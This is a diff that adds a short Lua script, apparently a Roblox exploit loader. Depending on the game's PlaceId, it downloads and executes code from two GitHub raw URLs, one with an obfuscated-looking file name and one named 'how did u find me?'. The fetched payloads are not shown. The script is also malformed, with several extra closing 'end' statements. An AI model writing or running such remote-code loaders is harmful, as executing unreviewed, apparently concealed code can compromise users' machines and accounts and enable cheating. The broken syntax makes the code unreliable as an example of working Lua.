@@ -1,0 +1,12 @@
+if game.PlaceId == 14044547200 then
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/blix200/MainLoadshiz/main/obf_krI8TV8y82847eQf3GYE2t0w0g4WVMFKf47v9u53kZsndg509DgRcWt5lzOi7Hu5.lua"))()
+else
+  if game.PlaceId == 286090429 then
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/imacoolguy17/kowaily/main/how%20did%20u%20find%20me%3F"))()
+  else
+                end
+          end
+        end
+    end
+  end
+end
